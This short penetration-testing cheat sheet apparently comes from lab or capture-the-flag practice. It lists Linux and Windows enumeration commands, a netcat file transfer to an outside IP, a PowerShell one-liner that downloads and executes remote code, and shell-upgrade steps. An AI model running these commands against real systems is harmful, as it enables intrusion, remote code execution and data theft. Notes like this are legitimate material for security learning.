# Tips

LinuxEnum: 

find / -perm -4000 2>/dev/null   //SUID files  \n
uname -a                         //Posible Linux Kernel Exploit

WindowsEnum:
whoami /all
systeminfo


File Transfer:
nc:
nc -l -p 4445 > ovrflw
nc -w 5 10.10.14.18 4445 < /usr/local/bin/ovrflw

powershell:

iex(New-Object System.Net.WebClient).DownloadString('http://10.10.10.10:8000/file')


Interactive shell:

python3 -c "import pty;pty.spawn('/bin/bash')"
Ctrl+Z
stty raw -echo
fg
